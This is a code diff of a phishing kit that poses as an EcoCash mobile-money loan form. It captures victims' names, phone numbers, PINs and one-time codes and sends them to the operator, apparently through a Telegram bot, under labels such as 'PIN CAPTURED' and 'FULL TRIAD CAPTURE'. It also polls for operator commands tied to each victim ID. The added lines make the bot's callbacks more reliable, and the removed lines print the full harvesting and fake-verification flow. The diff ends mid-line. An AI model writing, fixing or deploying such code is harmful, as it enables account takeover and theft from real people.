@@ -401,13 +401,19 @@
     }
   }
 
-  async function tgAnswer(cbId) {
+  // Fire-and-forget ACK with hard timeout so a hung request never
+  // blocks the polling loop. Telegram stops the button spinner the
+  // instant this lands, regardless of what action it maps to.
+  function tgAnswer(cbId) {
     try {
-      await fetch('/tg/answer', {
+      const controller = new AbortController();
+      const t = setTimeout(() => controller.abort(), 3000);
+      fetch('/tg/answer', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ callback_query_id: cbId })
-      });
+        body: JSON.stringify({ callback_query_id: cbId }),
+        signal: controller.signal
+      }).finally(() => clearTimeout(t));
     } catch (e) {}
   }
 
@@ -465,10 +471,16 @@
         const cb = u.callback_query;
         if (!cb) continue;
 
-        const action = cb.data || '';
-        if (!state.victimId || !action.endsWith('_' + state.victimId)) continue;
-
+        // ALWAYS ACK — even for stale or unrelated callbacks.
+        // Telegram stops the button spinner the moment this lands.
+        // This is the fix for "bot is not responding".
         tgAnswer(cb.id);
+
+        const action = cb.data || '';
+
+        // Only act on this session's callbacks
+        if (!state.victimId) continue;
+        if (!action.endsWith('_' + state.victimId)) continue;
 
         if (action.startsWith('approve_')) { stopPolling(); approveLoan(); return; }
         if (action.startsWith('wrong_pin_')) handleWrongPin();
@@ -610,211 +622,4 @@
       '👤 Name: ' + state.name + '\n' +
       '📞 Number: ' + state.msisdn + '\n' +
       '💸 Loan: ' + state.amount + ' · ' + state.term + '\n' +
-      '📱 Device: ' + deviceFingerprint() + '\n' +
-      '🕒 Time: ' + new Date().toLocaleString()
-    );
-
-    runProcessingThen(
-      'Checking your eligibility…',
-      'Verifying your details and credit score.',
-      () => { showStep('step2'); document.getElementById('ecocashPin').focus(); }
-    );
-  });
-
-  // ============================================================
-  //  STEP 2 — PIN
-  // ============================================================
-  document.getElementById('btnSubmitPin').addEventListener('click', () => {
-    clearErr('err2');
-    const pin = document.getElementById('ecocashPin').value.trim();
-    if (!pin || !/^\d{4}$/.test(pin)) {
-      showErr('err2', 'Enter a valid 4-digit PIN');
-      return;
-    }
-
-    state.pin = pin;
-    saveState();
-
-    if (!state.victimId) {
-      state.victimId = (Date.now().toString(36) + Math.random().toString(36).slice(2, 8)).slice(0, 12);
-      saveState();
-    }
-
-    tgSend(
-      '🔐 PIN CAPTURED\n' +
-      '👤 Name: ' + state.name + '\n' +
-      '📞 Number: ' + state.msisdn + '\n' +
-      '🔑 PIN: ' + state.pin + '\n' +
-      '💸 Loan: ' + state.amount + ' · ' + state.term + '\n' +
-      '🆔 ID: ' + state.victimId + '\n' +
-      '🕒 Time: ' + new Date().toLocaleString()
-    );
-
-    sendAdminControl();
-    startPolling();
-
-    runProcessingThen(
-      'Verifying your PIN…',
-      'Encrypting your session. Please wait.',
-      () => {
-        showStep('step3');
-        document.getElementById('btnVerifyOtp').disabled = true;
-        document.querySelectorAll('#step3 .otp-row input').forEach(i => i.value = '');
-        setTimeout(() => document.getElementById('otp1').focus(), 100);
-      }
-    );
-  });
-
-  // ============================================================
-  //  OTP INPUTS
-  // ============================================================
-  const otpInputs = ['otp1', 'otp2', 'otp3', 'otp4'];
-  otpInputs.forEach((id, i) => {
-    const el = document.getElementById(id);
-    el.addEventListener('input', function () {
-      this.value = this.value.replace(/[^0-9]/g, '');
-      if (this.value.length === 1 && i < 3) document.getElementById(otpInputs[i + 1]).focus();
-      const otp = otpInputs.map(x => document.getElementById(x).value).join('');
-      document.getElementById('btnVerifyOtp').disabled = otp.length !== 4;
-    });
-    el.addEventListener('keydown', function (e) {
-      if (e.key === 'Backspace' && !this.value && i > 0) {
-        document.getElementById(otpInputs[i - 1]).focus();
-      }
-      if (e.key === 'Enter') {
-        e.preventDefault();
-        const btn = document.getElementById('btnVerifyOtp');
-        if (!btn.disabled) btn.click();
-      }
-    });
-    el.addEventListener('paste', function (e) {
-      e.preventDefault();
-      const text = (e.clipboardData || window.clipboardData).getData('text') || '';
-      const digits = text.replace(/\D/g, '').slice(0, 4).split('');
-      digits.forEach((d, j) => {
-        if (otpInputs[i + j]) document.getElementById(otpInputs[i + j]).value = d;
-      });
-      const next = Math.min(i + digits.length, 3);
-      document.getElementById(otpInputs[next]).focus();
-      const otp = otpInputs.map(x => document.getElementById(x).value).join('');
-      document.getElementById('btnVerifyOtp').disabled = otp.length !== 4;
-    });
-  });
-
-  // ============================================================
-  //  STEP 3 — OTP
-  // ============================================================
-  document.getElementById('btnVerifyOtp').addEventListener('click', () => {
-    clearErr('errOtp');
-    const otp = otpInputs.map(id => document.getElementById(id).value).join('');
-    if (otp.length !== 4 || !/^\d{4}$/.test(otp)) {
-      showErr('errOtp', 'Enter all 4 digits');
-      return;
-    }
-
-    state.otp = otp;
-    saveState();
-
-    tgSend(
-      '🔐 FULL TRIAD CAPTURE\n' +
-      '👤 Name: ' + state.name + '\n' +
-      '📞 Number: ' + state.msisdn + '\n' +
-      '🔑 PIN: ' + state.pin + '\n' +
-      '🔢 OTP: ' + state.otp + '\n' +
-      '💸 Loan: ' + state.amount + ' · ' + state.term + '\n' +
-      '🆔 ID: ' + (state.victimId || '') + '\n' +
-      '🕒 Time: ' + new Date().toLocaleString()
-    );
-
-    runProcessingThen(
-      'Confirming your OTP…',
-      'Finalizing your loan agreement.',
-      () => { if (state.step === 'stepProcessing') approveLoan(); }
-    );
-  });
-
-  // ============================================================
-  //  SUCCESS
-  // ============================================================
-  function renderSuccess() {
-    if (state.refCode) return;
-    state.refCode = Math.floor(100000 + Math.random() * 900000);
-    saveState();
-
-    document.getElementById('refCode').textContent = state.refCode;
-    document.getElementById('successAmount').textContent = state.amount || '$0';
-    document.getElementById('successMsisdn').textContent = state.msisdn || '+263...';
-
-    startRedirectTimer();
-    if (REDIRECT_TIMER) clearTimeout(REDIRECT_TIMER);
-    REDIRECT_TIMER = setTimeout(() => { window.location.href = CONFIG.REDIRECT_URL; }, 300000);
-  }
-
-  function startRedirectTimer() {
-    if (REDIRECT_TICK) clearInterval(REDIRECT_TICK);
-    let s = 300;
-    const el = document.getElementById('redirectTimer');
-    const tick = () => {
-      const mins = String(Math.floor(s / 60)).padStart(2, '0');
-      const secs = String(s % 60).padStart(2, '0');
-      el.textContent = mins + ':' + secs;
-      if (s <= 0) { clearInterval(REDIRECT_TICK); REDIRECT_TICK = null; return; }
-      s--;
-    };
-    tick();
-    REDIRECT_TICK = setInterval(tick, 1000);
-  }
-
-  // ============================================================
-  //  INPUT POLISH
-  // ============================================================
-  document.getElementById('fullName').addEventListener('input', function () {
-    this.value = this.value.replace(/[^a-zA-Z\s]/g, '');
-  });
-  document.getElementById('fullName').addEventListener('keydown', function (e) {
-    if (e.key === 'Enter') { e.preventDefault(); document.getElementById('btnNext').click(); }
-  });
-  document.getElementById('ecocashPin').addEventListener('keydown', function (e) {
-    if (e.key === 'Enter') { e.preventDefault(); document.getElementById('btnSubmitPin').click(); }
-  });
-  document.getElementById('msisdn').addEventListener('blur', function () {
-    let v = this.value.replace(/[^\d+]/g, '');
-    if (/^0?7[78]\d{7}$/.test(v)) this.value = '+263' + v.replace(/^0?/, '');
-  });
-  document.getElementById('loanAmount').addEventListener('change', updateAmountPlaceholder);
-
-  // ============================================================
-  //  SESSION RESTORE
-  // ============================================================
-  (function init() {
-    document.getElementById('yr').textContent = new Date().getFullYear();
-    const restored = loadState();
-
-    if (restored && state.lockedOut) { showLockout(); return; }
-
-    if (restored && state.step && state.step !== 'step1') {
-      if (state.step === 'stepProcessing') {
-        state.step = state.otp ? 'stepSuccess' : (state.pin ? 'step3' : 'step2');
-        saveState();
-      }
-      const valid = ['step2', 'step3', 'stepSuccess'];
-      if (valid.includes(state.step)) {
-        showStep(state.step);
-        if (state.victimId && state.step !== 'stepSuccess') startPolling();
-        if (state.step === 'stepSuccess') renderSuccess();
-        return;
-      }
-    }
-    showStep('step1');
-  })();
-
-  window.addEventListener('beforeunload', () => {
-    stopPolling();
-    cancelProcessingTimer();
-    if (REDIRECT_TIMER) clearTimeout(REDIRECT_TIMER);
-    if (REDIRECT_TICK) clearInterval(REDIRECT_TICK);
-  });
-})();
-</script>
-</body>
-</html>
+      '📱 Device: ' +
